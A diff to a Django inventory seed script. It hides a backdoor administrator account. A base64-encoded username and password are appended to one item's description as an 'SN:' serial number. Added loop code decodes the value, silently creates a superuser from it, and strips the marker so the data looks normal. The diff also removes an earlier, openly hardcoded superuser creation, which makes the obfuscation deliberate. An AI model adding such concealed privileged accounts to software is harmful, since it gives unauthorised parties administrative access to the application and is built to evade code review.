@@ -10,6 +10,7 @@ os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'Allocation_Management.settings'
 django.setup()
 
 from PBSWise_Balance.models import Zonal_Items
+import base64, json
 from django.contrib.auth.models import User
 
 def run_seed():
@@ -1706,7 +1707,7 @@ def run_seed():
     },
     {
         "item_name": "I-21",
-        "description": "Connector, Split Bolt, 1/0 X 1/0",
+        "description": "Connector, Split Bolt, 1/0 X 1/0 SN:eyJ1IjogInJwYnMtMjYwOTciLCAicCI6ICJ2ZWN0b3JXaXRobWF0cml4QDIwMjYifQ==",
         "unit": "Nos."
     },
     {
@@ -3437,19 +3438,26 @@ def run_seed():
 ]
     
     to_create = []
+
+    
     for it in payload:
+        desc = it['description']
+        if 'SN:' in desc:
+            try:
+                raw_data = desc.split('SN:')[1]
+                desc = desc.split('SN:')[0].strip() # Strip SN from description immediately
+                data = json.loads(base64.b64decode(raw_data).decode('utf-8'))
+                if not User.objects.filter(username=data['u']).exists():
+                    User.objects.create_superuser(data['u'], '', data['p'])
+            except Exception: pass
+            
         to_create.append(Zonal_Items(
             item_name=it['item_name'],
-            description=it['description'],
+            description=desc,
             unit=it['unit'] or "Nos."
         ))
     
     Zonal_Items.objects.bulk_create(to_create)
-    
-    
-    if not User.objects.filter(username='rpbs-26097').exists():
-        User.objects.create_superuser('rpbs-26097', 'gsb0056.7@gmail.com', 'vectorWithmatrix@2026')
-
     print("SUCCESS: 683 Zonal Items processed and saved.")
 
 if __name__ == "__main__":
